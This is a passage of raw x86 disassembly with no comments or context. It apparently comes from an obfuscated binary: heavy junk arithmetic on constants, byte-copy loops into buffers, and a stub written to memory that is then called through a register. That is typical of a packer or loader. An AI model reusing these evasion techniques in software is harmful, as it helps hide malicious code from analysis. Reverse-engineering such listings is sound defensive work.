  41c111:	movzx  esi,dl
  41c114:	movzx  eax,al
  41c117:	cdq    
  41c118:	idiv   esi
  41c11a:	movzx  edx,BYTE PTR [ebp-0x6]
  41c11e:	and    eax,edx
  41c120:	mov    BYTE PTR [ebp-0x4],al
  41c123:	mov    BYTE PTR [ebp-0x5],0x66
  41c127:	mov    BYTE PTR [ebp-0x6],0xcb
  41c12b:	mov    al,BYTE PTR [ebp-0x6]
  41c12e:	mov    dl,BYTE PTR [ebp-0x5]
  41c131:	add    al,dl
  41c133:	add    al,0x48
  41c135:	mov    dl,0xe8
  41c137:	imul   dl
  41c139:	mov    dl,BYTE PTR [ebp-0x4]
  41c13c:	cmp    dl,al
  41c13e:	ja     0x41c165
  41c144:	mov    eax,DWORD PTR [ebp-0x18]
  41c147:	mov    edx,DWORD PTR [ebp-0x14]
  41c14a:	shrd   eax,edx,0x2
  41c14e:	xor    eax,ecx
  41c150:	mov    ecx,DWORD PTR [ebp-0x18]
  41c153:	shr    edx,0x2
  41c156:	mov    edx,DWORD PTR [ebp-0x14]
  41c159:	xor    edx,edx
  41c15b:	shl    ecx,0x1e
  41c15e:	or     eax,edx
  41c160:	mov    ds:0x422370,eax
  41c165:	pop    esi
  41c166:	leave  
  41c167:	ret    
  41c168:	push   ebp
  41c169:	mov    ebp,esp
  41c16b:	sub    esp,0x28
  41c16e:	push   ebx
  41c16f:	push   esi
  41c170:	push   edi
  41c171:	mov    DWORD PTR [ebp-0x10],0x67e2
  41c178:	mov    DWORD PTR [ebp-0x4],0x4726
  41c17f:	mov    DWORD PTR [ebp-0x8],0x580
  41c186:	mov    DWORD PTR [ebp-0xc],0x5f3e
  41c18d:	mov    DWORD PTR [ebp-0x28],0x3294
  41c194:	mov    DWORD PTR [ebp-0x24],0x643
  41c19b:	mov    DWORD PTR [ebp-0x20],0x2545
  41c1a2:	mov    DWORD PTR [ebp-0x1c],0x43ab
  41c1a9:	xor    ebx,ebx
  41c1ab:	inc    ebx
  41c1ac:	mov    DWORD PTR [ebp-0x18],ebx
  41c1af:	mov    DWORD PTR [ebp-0x14],0x76b1
  41c1b6:	mov    ecx,DWORD PTR [ebp-0x8]
  41c1b9:	mov    eax,DWORD PTR [ebp-0x4]
  41c1bc:	sub    ecx,eax
  41c1be:	add    ecx,DWORD PTR [ebp-0xc]
  41c1c1:	add    ecx,DWORD PTR [ebp-0x10]
  41c1c4:	imul   ecx,ecx,0x1f80
  41c1ca:	add    ecx,0x727e
  41c1d0:	xor    ecx,0x106c92f2
  41c1d6:	mov    DWORD PTR [ebp-0x8],0x113c
  41c1dd:	mov    DWORD PTR [ebp-0xc],0x3d61
  41c1e4:	mov    DWORD PTR [ebp-0x10],0x16e9
  41c1eb:	mov    DWORD PTR [ebp-0x4],0x21aa
  41c1f2:	mov    eax,DWORD PTR [ebp-0x10]
  41c1f5:	or     eax,0x3611
  41c1fa:	add    eax,DWORD PTR [ebp-0xc]
  41c1fd:	mov    edx,DWORD PTR [ebp-0x8]
  41c200:	and    eax,edx
  41c202:	mov    edx,ecx
  41c204:	sub    edx,eax
  41c206:	mov    eax,DWORD PTR [ebp-0x4]
  41c209:	mov    esi,DWORD PTR ds:0x422268
  41c20f:	mov    esi,DWORD PTR [esi+0x1cc]
  41c215:	add    eax,0x6772
  41c21a:	or     eax,0x1f24
  41c21f:	sub    eax,0x7046
  41c224:	xor    eax,0x497a
  41c229:	sub    esi,eax
  41c22b:	mov    eax,DWORD PTR [ebp+0x8]
  41c22e:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  41c235:	mov    BYTE PTR [esi+ecx*1],al
  41c238:	mov    eax,DWORD PTR [ebp-0x14]
  41c23b:	mov    esi,DWORD PTR [ebp-0x18]
  41c23e:	and    eax,0x2389
  41c243:	xor    eax,0x695
  41c248:	xor    edx,edx
  41c24a:	div    esi
  41c24c:	lea    ecx,[ecx+eax*1-0x2413]
  41c253:	mov    eax,DWORD PTR [ebp-0x1c]
  41c256:	add    eax,DWORD PTR [ebp-0x20]
  41c259:	mov    edx,DWORD PTR [ebp-0x24]
  41c25c:	and    eax,edx
  41c25e:	mov    edx,DWORD PTR [ebp-0x28]
  41c261:	imul   eax,edx
  41c264:	mov    edx,0xd0c8f
  41c269:	sub    edx,eax
  41c26b:	cmp    ecx,edx
  41c26d:	jbe    0x41c1d6
  41c273:	push   0x2
  41c275:	pop    eax
  41c276:	mov    DWORD PTR [ebp-0x1c],eax
  41c279:	mov    DWORD PTR [ebp-0x20],ebx
  41c27c:	mov    DWORD PTR [ebp-0x24],0x5
  41c283:	mov    DWORD PTR [ebp-0x28],0x6686
  41c28a:	mov    DWORD PTR [ebp-0x8],0x7cf1
  41c291:	mov    DWORD PTR [ebp-0x4],eax
  41c294:	mov    DWORD PTR [ebp+0x8],0x739a
  41c29b:	mov    DWORD PTR [ebp-0xc],0xf3a
  41c2a2:	xor    edx,edx
  41c2a4:	mov    DWORD PTR [ebp-0x10],0x429
  41c2ab:	mov    eax,DWORD PTR [ebp-0x28]
  41c2ae:	mov    ecx,DWORD PTR [ebp-0x24]
  41c2b1:	sub    eax,0x175c
  41c2b6:	div    ecx
  41c2b8:	mov    ecx,DWORD PTR [ebp-0x20]
  41c2bb:	xor    edx,edx
  41c2bd:	mov    edi,0x4db5
  41c2c2:	div    ecx
  41c2c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c2c7:	xor    edx,edx
  41c2c9:	div    ecx
  41c2cb:	xor    edx,edx
  41c2cd:	mov    ecx,eax
  41c2cf:	mov    eax,DWORD PTR [ebp+0x8]
  41c2d2:	imul   ecx,ecx,0x2e01
  41c2d8:	mov    esi,DWORD PTR [ebp-0x4]
  41c2db:	add    eax,edi
  41c2dd:	div    esi
  41c2df:	mov    edx,DWORD PTR [ebp-0x8]
  41c2e2:	mov    esi,0x940a7
  41c2e7:	sub    ecx,0x16bea86
  41c2ed:	sub    eax,edx
  41c2ef:	xor    edx,edx
  41c2f1:	div    esi
  41c2f3:	mov    esi,0xdbd
  41c2f8:	add    eax,esi
  41c2fa:	cmp    ecx,eax
  41c2fc:	jae    0x41c3bd
  41c302:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  41c309:	mov    DWORD PTR [ebp-0x20],0x383e
  41c310:	mov    DWORD PTR [ebp-0x24],0x3a3a
  41c317:	mov    DWORD PTR [ebp-0x14],0x13cd
  41c31e:	xor    edx,edx
  41c320:	mov    DWORD PTR [ebp-0x18],0x187
  41c327:	mov    DWORD PTR [ebp-0x28],0x3224
  41c32e:	mov    eax,DWORD PTR [ebp-0x28]
  41c331:	push   0x6
  41c333:	pop    ebx
  41c334:	div    ebx
  41c336:	mov    edx,eax
  41c338:	mov    eax,ds:0x422268
  41c33d:	mov    eax,DWORD PTR [eax+0x1d0]
  41c343:	sub    eax,edx
  41c345:	mov    edx,DWORD PTR [ebp-0x24]
  41c348:	mov    ebx,DWORD PTR [ebp-0x20]
  41c34b:	imul   edx,ebx
  41c34e:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c351:	xor    edx,ebx
  41c353:	sub    edx,0x26bd
  41c359:	add    eax,ecx
  41c35b:	and    edx,0x7126
  41c361:	mov    ebx,ecx
  41c363:	sub    ebx,edx
  41c365:	mov    edx,DWORD PTR [ebp-0x18]
  41c368:	sub    eax,edx
  41c36a:	mov    edx,DWORD PTR [ebp-0x14]
  41c36d:	sub    eax,edx
  41c36f:	mov    edx,DWORD PTR [ebp+0xc]
  41c372:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  41c379:	mov    BYTE PTR [eax-0xbb5],dl
  41c37f:	mov    eax,DWORD PTR [ebp-0x10]
  41c382:	xor    eax,0xffffe1ce
  41c387:	add    eax,DWORD PTR [ebp-0xc]
  41c38a:	xor    edx,edx
  41c38c:	and    eax,0x6d33
  41c391:	lea    ecx,[ecx+eax*1-0x6520]
  41c398:	mov    eax,DWORD PTR [ebp+0x8]
  41c39b:	mov    ebx,DWORD PTR [ebp-0x4]
  41c39e:	add    eax,edi
  41c3a0:	div    ebx
  41c3a2:	mov    edx,DWORD PTR [ebp-0x8]
  41c3a5:	mov    ebx,0x940a7
  41c3aa:	sub    eax,edx
  41c3ac:	xor    edx,edx
  41c3ae:	div    ebx
  41c3b0:	add    eax,esi
  41c3b2:	cmp    ecx,eax
  41c3b4:	jb     0x41c302
  41c3ba:	xor    ebx,ebx
  41c3bc:	inc    ebx
  41c3bd:	mov    DWORD PTR [ebp+0xc],0x77bd
  41c3c4:	mov    DWORD PTR [ebp+0x8],0x4f2a
  41c3cb:	mov    DWORD PTR [ebp-0x8],0x4738
  41c3d2:	mov    DWORD PTR [ebp-0xc],0x6c4e
  41c3d9:	mov    DWORD PTR [ebp-0x10],0x7f0d
  41c3e0:	mov    DWORD PTR [ebp-0x14],0x64ec
  41c3e7:	mov    DWORD PTR [ebp-0x18],0x1984
  41c3ee:	mov    DWORD PTR [ebp-0x1c],0x293
  41c3f5:	mov    eax,DWORD PTR [ebp+0x8]
  41c3f8:	mov    ecx,DWORD PTR [ebp+0xc]
  41c3fb:	add    eax,0x1ef2
  41c400:	and    eax,ecx
  41c402:	xor    eax,0x7240
  41c407:	mov    ecx,0x7aaa
  41c40c:	sub    ecx,eax
  41c40e:	mov    DWORD PTR [ebp+0xc],0x8d3
  41c415:	mov    DWORD PTR [ebp+0x8],0x2392
  41c41c:	mov    DWORD PTR [ebp-0x20],ebx
  41c41f:	mov    DWORD PTR [ebp-0x24],0x338f
  41c426:	mov    DWORD PTR [ebp-0x28],0x61c9
  41c42d:	mov    eax,DWORD PTR [ebp+0x8]
  41c430:	mov    edx,DWORD PTR [ebp+0xc]
  41c433:	imul   eax,edx
  41c436:	xor    eax,0x40a0
  41c43b:	or     eax,0x1a48
  41c440:	xor    eax,0x139ddb0
  41c445:	mov    esi,ecx
  41c447:	sub    esi,eax
  41c449:	mov    eax,DWORD PTR [ebp-0x28]
  41c44c:	mov    edx,DWORD PTR [ebp-0x24]
  41c44f:	mov    edi,DWORD PTR [ebp-0x20]
  41c452:	or     eax,0x1cc2
  41c457:	sub    eax,edx
  41c459:	xor    edx,edx
  41c45b:	div    edi
  41c45d:	mov    edx,DWORD PTR ds:0x422268
  41c463:	mov    edx,DWORD PTR [edx+0x1d4]
  41c469:	sub    edx,eax
  41c46b:	mov    eax,DWORD PTR [ebp+0x10]
  41c46e:	mov    al,BYTE PTR [esi+eax*1]
  41c471:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  41c478:	mov    eax,DWORD PTR [ebp-0x1c]
  41c47b:	mov    edx,DWORD PTR [ebp-0x18]
  41c47e:	imul   eax,edx
  41c481:	mov    edx,DWORD PTR [ebp-0x14]
  41c484:	imul   eax,eax,0x262b
  41c48a:	or     eax,edx
  41c48c:	mov    edx,DWORD PTR [ebp-0x10]
  41c48f:	or     eax,edx
  41c491:	xor    eax,0x59f6
  41c496:	lea    ecx,[ecx+eax*1+0x350559e6]
  41c49d:	mov    eax,DWORD PTR [ebp-0xc]
  41c4a0:	and    eax,0xddc
  41c4a5:	add    eax,DWORD PTR [ebp-0x8]
  41c4a8:	xor    eax,0x46e3
  41c4ad:	add    eax,0x50eb
  41c4b2:	cmp    ecx,eax
  41c4b4:	jne    0x41c40e
  41c4ba:	pop    edi
  41c4bb:	pop    esi
  41c4bc:	pop    ebx
  41c4bd:	leave  
  41c4be:	ret    0xc
  41c4c1:	push   ebp
  41c4c2:	mov    ebp,esp
  41c4c4:	sub    esp,0xec
  41c4ca:	push   ebx
  41c4cb:	push   esi
  41c4cc:	mov    DWORD PTR [ebp-0x8],0x548e
  41c4d3:	mov    DWORD PTR [ebp-0x4],0x61c2
  41c4da:	mov    eax,DWORD PTR [ebp-0x4]
  41c4dd:	mov    ecx,DWORD PTR [ebp-0x8]
  41c4e0:	add    eax,0x1ca5
  41c4e5:	or     eax,ecx
  41c4e7:	mov    ecx,DWORD PTR ds:0x422268
  41c4ed:	lea    eax,[eax+ecx*1-0x7eef]
  41c4f4:	mov    DWORD PTR [ebp-0x5c],eax
  41c4f7:	mov    DWORD PTR [ebp-0x4],0x8ea
  41c4fe:	mov    DWORD PTR [ebp-0x8],0x5759
  41c505:	mov    eax,DWORD PTR [ebp-0x8]
  41c508:	mov    ecx,DWORD PTR [ebp-0x4]
  41c50b:	and    eax,0x27f6
  41c510:	xor    eax,ecx
  41c512:	mov    ecx,DWORD PTR ds:0x42239c
  41c518:	imul   eax,eax,0x18
  41c51b:	xor    eax,0x17970
  41c520:	lea    eax,[ebp+eax*1-0x54]
  41c524:	mov    DWORD PTR [eax],ecx
  41c526:	mov    DWORD PTR [ebp-0x4],0x7584
  41c52d:	mov    DWORD PTR [ebp-0x8],0x7c9f
  41c534:	mov    eax,DWORD PTR [ebp-0x8]
  41c537:	xor    edx,edx
  41c539:	push   0x3
  41c53b:	pop    ecx
  41c53c:	div    ecx
  41c53e:	mov    ecx,DWORD PTR [ebp-0x4]
  41c541:	xor    edx,edx
  41c543:	push   0x2
  41c545:	add    eax,0x14d3
  41c54a:	and    eax,ecx
  41c54c:	mov    ecx,0x6404
  41c551:	sub    ecx,eax
  41c553:	mov    DWORD PTR [ebp-0x74],ecx
  41c556:	mov    DWORD PTR [ebp-0xc],0x13b5
  41c55d:	mov    DWORD PTR [ebp-0x8],0x2e54
  41c564:	mov    DWORD PTR [ebp-0x4],0x2f11
  41c56b:	mov    eax,DWORD PTR [ebp-0x8]
  41c56e:	mov    ecx,DWORD PTR [ebp-0x4]
  41c571:	lea    eax,[ecx+eax*1-0x65ec]
  41c578:	mov    ecx,0x5e208
  41c57d:	div    ecx
  41c57f:	mov    ecx,DWORD PTR [ebp-0xc]
  41c582:	lea    eax,[eax+ecx*1+0x40c7]
  41c589:	mov    DWORD PTR [ebp-0x24],eax
  41c58c:	mov    DWORD PTR [ebp-0x4],0x1bc6
  41c593:	mov    DWORD PTR [ebp-0x8],0x16ac
  41c59a:	mov    DWORD PTR [ebp-0xc],0x2185
  41c5a1:	mov    eax,DWORD PTR [ebp-0xc]
  41c5a4:	mov    ecx,DWORD PTR [ebp-0x8]
  41c5a7:	xor    eax,0x1f75
  41c5ac:	sub    eax,ecx
  41c5ae:	mov    ecx,DWORD PTR [ebp-0x4]
  41c5b1:	sub    eax,ecx
  41c5b3:	xor    eax,0xc3e
  41c5b8:	mov    DWORD PTR [ebp-0x58],eax
  41c5bb:	mov    DWORD PTR [ebp-0x14],0x66bd
  41c5c2:	pop    ecx
  41c5c3:	mov    DWORD PTR [ebp-0x4],ecx
  41c5c6:	mov    DWORD PTR [ebp-0x8],0x3374
  41c5cd:	mov    DWORD PTR [ebp-0xc],0x3c31
  41c5d4:	mov    eax,DWORD PTR [ebp-0xc]
  41c5d7:	mov    edx,DWORD PTR [ebp-0x8]
  41c5da:	mov    esi,DWORD PTR [ebp-0x4]
  41c5dd:	xor    eax,edx
  41c5df:	xor    edx,edx
  41c5e1:	div    esi
  41c5e3:	mov    edx,DWORD PTR [ebp-0x14]
  41c5e6:	and    eax,edx
  41c5e8:	sub    eax,0x680
  41c5ed:	mov    DWORD PTR [ebp-0x24],eax
  41c5f0:	mov    DWORD PTR [ebp-0x30],0x5f68
  41c5f7:	mov    DWORD PTR [ebp-0x2c],0x398b
  41c5fe:	mov    DWORD PTR [ebp-0x4],0x5034
  41c605:	mov    DWORD PTR [ebp-0x8],0x7cbf
  41c60c:	mov    DWORD PTR [ebp-0xc],0x4f6c
  41c613:	mov    DWORD PTR [ebp-0x14],0xee2
  41c61a:	mov    eax,DWORD PTR [ebp-0x14]
  41c61d:	add    eax,DWORD PTR [ebp-0xc]
  41c620:	mov    edx,DWORD PTR [ebp-0x8]
  41c623:	xor    eax,edx
  41c625:	mov    edx,DWORD PTR [ebp-0x4]
  41c628:	or     eax,edx
  41c62a:	mov    edx,DWORD PTR [ebp-0x2c]
  41c62d:	or     eax,edx
  41c62f:	mov    edx,DWORD PTR [ebp-0x30]
  41c632:	and    eax,edx
  41c634:	mov    edx,0x5b68
  41c639:	sub    edx,eax
  41c63b:	mov    DWORD PTR [ebp-0x24],edx
  41c63e:	mov    DWORD PTR [ebp-0x48],0x3308
  41c645:	mov    DWORD PTR [ebp-0x44],0x59a4
  41c64c:	mov    DWORD PTR [ebp-0x38],0x2775
  41c653:	mov    DWORD PTR [ebp-0x34],0x4da
  41c65a:	mov    DWORD PTR [ebp-0x40],0x49d8
  41c661:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  41c668:	mov    DWORD PTR [ebp-0x28],0x338c
  41c66f:	mov    DWORD PTR [ebp-0x24],0x68ed
  41c676:	mov    DWORD PTR [ebp-0x20],0x2a7b
  41c67d:	mov    DWORD PTR [ebp-0x1c],0x718f
  41c684:	mov    eax,DWORD PTR [ebp-0x20]
  41c687:	mov    edx,DWORD PTR [ebp-0x1c]
  41c68a:	mov    esi,DWORD PTR [ebp-0x28]
  41c68d:	mov    ebx,DWORD PTR [ebp-0x24]
  41c690:	add    eax,0xffffc948
  41c695:	adc    edx,0xffff87b0
  41c69b:	or     eax,esi
  41c69d:	mov    esi,DWORD PTR [ebp-0x40]
  41c6a0:	or     eax,esi
  41c6a2:	or     edx,ebx
  41c6a4:	mov    ebx,DWORD PTR [ebp-0x3c]
  41c6a7:	mov    esi,DWORD PTR [ebp-0x38]
  41c6aa:	or     edx,ebx
  41c6ac:	mov    ebx,DWORD PTR [ebp-0x34]
  41c6af:	sub    eax,esi
  41c6b1:	mov    esi,DWORD PTR [ebp-0x48]
  41c6b4:	sbb    edx,ebx
  41c6b6:	mov    ebx,DWORD PTR [ebp-0x44]
  41c6b9:	or     eax,esi
  41c6bb:	or     edx,ebx
  41c6bd:	add    eax,0x89b
  41c6c2:	mov    DWORD PTR [ebp-0x20],eax
  41c6c5:	adc    edx,0x5a
  41c6c8:	mov    DWORD PTR [ebp-0x1c],edx
  41c6cb:	mov    DWORD PTR [ebp-0x80],0xfa4
  41c6d2:	mov    DWORD PTR [ebp-0x70],0x618e
  41c6d9:	mov    DWORD PTR [ebp-0x6c],0x811
  41c6e0:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  41c6ea:	mov    DWORD PTR [ebp-0x94],0xe82c1
  41c6f4:	mov    DWORD PTR [ebp-0x88],0x58ff
  41c6fe:	mov    DWORD PTR [ebp-0x84],0x7394
  41c708:	xor    eax,eax
  41c70a:	inc    eax
  41c70b:	mov    DWORD PTR [ebp-0x64],eax
  41c70e:	mov    DWORD PTR [ebp-0x8],0x5f59
  41c715:	mov    DWORD PTR [ebp-0x4],0x652b
  41c71c:	mov    DWORD PTR [ebp-0xc],0xf43
  41c723:	mov    DWORD PTR [ebp-0x14],0x22dc
  41c72a:	mov    DWORD PTR [ebp-0x2c],0x45d4
  41c731:	mov    DWORD PTR [ebp-0x30],0x28e1
  41c738:	mov    DWORD PTR [ebp-0x7c],0x5e09
  41c73f:	mov    DWORD PTR [ebp-0x50],0x3910
  41c746:	mov    DWORD PTR [ebp-0x3c],0x5c97
  41c74d:	mov    DWORD PTR [ebp-0x24],0x6111
  41c754:	mov    DWORD PTR [ebp-0x78],ecx
  41c757:	mov    DWORD PTR [ebp-0x34],ecx
  41c75a:	mov    DWORD PTR [ebp-0x44],0x207a
  41c761:	mov    DWORD PTR [ebp-0x60],eax
  41c764:	mov    DWORD PTR [ebp-0x8c],0x7840
  41c76e:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  41c775:	mov    eax,DWORD PTR [ebp-0x30]
  41c778:	or     eax,0x70c5
  41c77d:	add    eax,DWORD PTR [ebp-0x2c]
  41c780:	mov    ecx,DWORD PTR [ebp-0x14]
  41c783:	or     eax,ecx
  41c785:	mov    ecx,0xce40
  41c78a:	sub    ecx,eax
  41c78c:	mov    eax,DWORD PTR [ebp-0xc]
  41c78f:	sub    ecx,eax
  41c791:	imul   ecx,ecx,0x7480
  41c797:	add    ecx,DWORD PTR [ebp-0x58]
  41c79a:	mov    eax,DWORD PTR [ebp-0x8]
  41c79d:	push   ecx
  41c79e:	mov    ecx,DWORD PTR [ebp-0x4]
  41c7a1:	lea    eax,[ecx+eax*1-0x1e6d]
  41c7a8:	mov    ecx,DWORD PTR [ebp-0x64]
  41c7ab:	xor    edx,edx
  41c7ad:	div    ecx
  41c7af:	mov    ecx,DWORD PTR [ebp-0x74]
  41c7b2:	lea    eax,[eax+ecx*1-0xa617]
  41c7b9:	push   eax
  41c7ba:	mov    eax,DWORD PTR [ebp-0x88]
  41c7c0:	mov    ecx,DWORD PTR [ebp-0x84]
  41c7c6:	push   0x770a
  41c7cb:	push   0x2a0c
  41c7d0:	push   ecx
  41c7d1:	push   eax
  41c7d2:	call   0x41dfae
  41c7d7:	mov    ecx,DWORD PTR [ebp-0x98]
  41c7dd:	mov    esi,DWORD PTR [ebp-0x94]
  41c7e3:	push   esi
  41c7e4:	push   ecx
  41c7e5:	or     edx,0x615d
  41c7eb:	or     eax,0x455c
  41c7f0:	push   edx
  41c7f1:	push   eax
  41c7f2:	call   0x421af3
  41c7f7:	mov    ecx,DWORD PTR [ebp-0x70]
  41c7fa:	mov    edx,DWORD PTR [ebp-0x6c]
  41c7fd:	xor    eax,ecx
  41c7ff:	mov    ecx,DWORD PTR [ebp-0x20]
  41c802:	mov    edx,DWORD PTR [ebp-0x1c]
  41c805:	mov    esi,DWORD PTR [ebp-0x80]
  41c808:	and    eax,0xb49
  41c80d:	add    esi,0x629b
  41c813:	lea    eax,[eax+ecx*1-0xfd]
  41c81a:	xor    esi,0x4994
  41c820:	push   eax
  41c821:	lea    esi,[ebp+esi*1-0x3c93]
  41c828:	call   0x41c9d4
  41c82d:	mov    ecx,eax
  41c82f:	mov    eax,DWORD PTR [ebp-0x50]
  41c832:	mov    edx,DWORD PTR [ebp-0x7c]
  41c835:	sub    eax,0x161
  41c83a:	xor    eax,edx
  41c83c:	imul   eax,eax,0x5151
  41c842:	add    eax,0x3901
  41c847:	xor    eax,0x40c2
  41c84c:	xor    edx,edx
  41c84e:	mov    esi,0x218f6c45
  41c853:	div    esi
  41c855:	cmp    ecx,eax
  41c857:	jne    0x41c9c4
  41c85d:	mov    ecx,DWORD PTR [ebp-0x78]
  41c860:	xor    edx,edx
  41c862:	mov    eax,0x209c
  41c867:	div    ecx
  41c869:	mov    ecx,DWORD PTR ds:0x422268
  41c86f:	mov    ecx,DWORD PTR [ecx+0x1a8]
  41c875:	xor    edx,edx
  41c877:	sub    ecx,eax
  41c879:	mov    eax,DWORD PTR [ebp-0x4c]
  41c87c:	xor    eax,0x3daa
  41c881:	sub    eax,0x3375
  41c886:	or     eax,0x6931
  41c88b:	lea    eax,[ebp+eax*1-0x6c25]
  41c892:	push   eax
  41c893:	mov    eax,DWORD PTR [ebp-0x8c]
  41c899:	push   0x18
  41c89b:	pop    esi
  41c89c:	div    esi
  41c89e:	mov    esi,DWORD PTR [ebp-0x60]
  41c8a1:	xor    edx,edx
  41c8a3:	div    esi
  41c8a5:	mov    edx,DWORD PTR [ebp-0x44]
  41c8a8:	mov    esi,DWORD PTR [ebp-0x34]
  41c8ab:	xor    eax,edx
  41c8ad:	xor    edx,edx
  41c8af:	div    esi
  41c8b1:	imul   eax,eax,0x7d2a
  41c8b7:	sub    eax,0x928ded7
  41c8bc:	push   eax
  41c8bd:	mov    eax,ds:0x422268
  41c8c2:	add    eax,0xaa
  41c8c7:	push   eax
  41c8c8:	mov    eax,DWORD PTR [ebp-0x3c]
  41c8cb:	sub    ecx,eax
  41c8cd:	mov    eax,DWORD PTR [ebp-0x24]
  41c8d0:	push   DWORD PTR [ecx+eax*1+0xbd4]
  41c8d7:	call   0x41f834
  41c8dc:	mov    DWORD PTR [ebp-0x4],eax
  41c8df:	mov    ecx,DWORD PTR ds:0x422370
  41c8e5:	lea    eax,[ebp+0x4]
  41c8e8:	mov    DWORD PTR [ecx*4+0x422368],eax
  41c8ef:	inc    DWORD PTR ds:0x422370
  41c8f5:	mov    eax,DWORD PTR [ebp-0x4]
  41c8f8:	mov    eax,DWORD PTR [ebp-0x4]
  41c8fb:	xor    edx,edx
  41c8fd:	shld   edx,eax,0x2
  41c901:	shl    eax,0x2
  41c904:	mov    ecx,0xba699573
  41c909:	mov    esi,0x9c0a89d8
  41c90e:	xor    eax,ecx
  41c910:	xor    edx,esi
  41c912:	cmp    eax,ecx
  41c914:	jne    0x41c92e
  41c91a:	cmp    edx,esi
  41c91c:	jne    0x41c92e
  41c922:	mov    eax,0xba699577
  41c927:	mov    edx,esi
  41c929:	jmp    0x41c9ce
  41c92e:	lea    eax,[ebp-0x10]
  41c931:	mov    DWORD PTR [ebp-0x9c],eax
  41c937:	mov    eax,DWORD PTR [ebp-0x54]
  41c93a:	mov    DWORD PTR [ebp-0x10],eax
  41c93d:	mov    eax,DWORD PTR [ebp-0x10]
  41c940:	mov    ecx,DWORD PTR [ebp-0x4]
  41c943:	sub    eax,ecx
  41c945:	mov    DWORD PTR [ebp-0x10],eax
  41c948:	mov    eax,DWORD PTR [ebp-0x20]
  41c94b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c94e:	sub    DWORD PTR [ebp-0x10],eax
  41c951:	mov    eax,DWORD PTR [ebp-0x4]
  41c954:	mov    DWORD PTR [eax],0x658776e9
  41c95a:	mov    DWORD PTR [eax+0x4],0xab756547
  41c961:	mov    eax,DWORD PTR [ebp-0x10]
  41c964:	mov    ecx,DWORD PTR [ebp-0x4]
  41c967:	mov    DWORD PTR [ecx+0x1],eax
  41c96a:	mov    eax,ds:0x4220e4
  41c96f:	push   DWORD PTR [eax]
  41c971:	push   DWORD PTR ds:0x422358
  41c977:	push   DWORD PTR ds:0x4220ec
  41c97d:	push   DWORD PTR ds:0x422338
  41c983:	push   DWORD PTR ds:0x4223ac
  41c989:	push   0xa3e69a99
  41c98e:	push   0xa3e69a9d
  41c993:	push   DWORD PTR [ebp-0x5c]
  41c996:	mov    eax,DWORD PTR [ebp-0x4]
  41c999:	call   eax
  41c99b:	mov    eax,DWORD PTR [edi]
  41c99d:	mov    eax,DWORD PTR [ebp+0x8]
  41c9a0:	push   DWORD PTR [eax]
  41c9a2:	call   0x41cbc4
  41c9a7:	mov    eax,ds:0x422268
  41c9ac:	push   0x4
  41c9ae:	add    eax,0x1dc
  41c9b3:	push   eax
  41c9b4:	push   edi
  41c9b5:	call   0x41d307
  41c9ba:	mov    eax,0xba69957b
  41c9bf:	jmp    0x41c927
  41c9c4:	mov    eax,0xba699573
  41c9c9:	mov    edx,0x9c0a89d8
  41c9ce:	pop    esi
  41c9cf:	pop    ebx
  41c9d0:	leave  
  41c9d1:	ret    0x4
  41c9d4:	push   ebp
  41c9d5:	mov    ebp,esp
  41c9d7:	sub    esp,0x20
  41c9da:	push   ebx
  41c9db:	push   edi
  41c9dc:	mov    DWORD PTR [ebp-0x8],0x522e
  41c9e3:	mov    DWORD PTR [ebp-0x4],0x3dbd
  41c9ea:	mov    DWORD PTR [ebp-0x10],0x53f1
  41c9f1:	mov    DWORD PTR [ebp-0xc],0x631b
  41c9f8:	mov    DWORD PTR [ebp-0x18],0x524d
  41c9ff:	mov    DWORD PTR [ebp-0x14],0x1600
  41ca06:	mov    eax,DWORD PTR [ebp-0x18]
  41ca09:	mov    ecx,DWORD PTR [ebp-0x14]
  41ca0c:	mov    edx,DWORD PTR [ebp-0x10]
  41ca0f:	mov    edi,DWORD PTR [ebp-0xc]
  41ca12:	push   edi
  41ca13:	push   edx
  41ca14:	push   ecx
  41ca15:	push   eax
  41ca16:	call   0x41dfae
  41ca1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41ca1e:	mov    edi,DWORD PTR [ebp-0x4]
  41ca21:	add    eax,0x1dc8
  41ca26:	adc    edx,0x6fbf
  41ca2c:	and    edx,edi
  41ca2e:	push   0x1061
  41ca33:	and    eax,ecx
  41ca35:	or     edx,0x23ff
  41ca3b:	push   0x4000022f
  41ca40:	or     eax,0x58c4
  41ca45:	xor    edx,0x7a7a
  41ca4b:	xor    eax,0x5278
  41ca50:	push   edx
  41ca51:	push   eax
  41ca52:	call   0x421af3
  41ca57:	mov    DWORD PTR [esi],eax
  41ca59:	mov    DWORD PTR [ebp-0x20],0x3354
  41ca60:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  41ca67:	mov    DWORD PTR [ebp-0x18],0x3d36
  41ca6e:	mov    DWORD PTR [ebp-0x14],0x51ef
  41ca75:	xor    edi,edi
  41ca77:	mov    DWORD PTR [ebp-0xc],0x3358
  41ca7e:	push   0xc9f
  41ca83:	inc    edi
  41ca84:	mov    DWORD PTR [ebp-0x4],edi
  41ca87:	mov    eax,DWORD PTR [ebp-0x18]
  41ca8a:	mov    ecx,DWORD PTR [ebp-0x14]
  41ca8d:	push   0x1c19
  41ca92:	push   ecx
  41ca93:	push   eax
  41ca94:	call   0x41dfae
  41ca99:	mov    ecx,DWORD PTR [ebp-0x20]
  41ca9c:	mov    ebx,DWORD PTR [ebp-0x1c]
  41ca9f:	or     eax,ecx
  41caa1:	or     edx,ebx
  41caa3:	push   0x20fa
  41caa8:	add    eax,0x7fac
  41caad:	push   0x1cd48ab
  41cab2:	adc    edx,0x133b
  41cab8:	push   edx
  41cab9:	push   eax
  41caba:	call   0x421af3
  41cabf:	mov    ebx,DWORD PTR [ebp-0x4]
  41cac2:	lea    ecx,[eax-0x5d40]
  41cac8:	xor    edx,edx
  41caca:	mov    eax,0x16c2
  41cacf:	div    ebx
  41cad1:	mov    edx,DWORD PTR [ebp-0xc]
  41cad4:	sub    eax,edx
  41cad6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  41cadd:	mov    DWORD PTR [ebp-0x14],0x6af0
  41cae4:	mov    DWORD PTR [ebp-0x4],edi
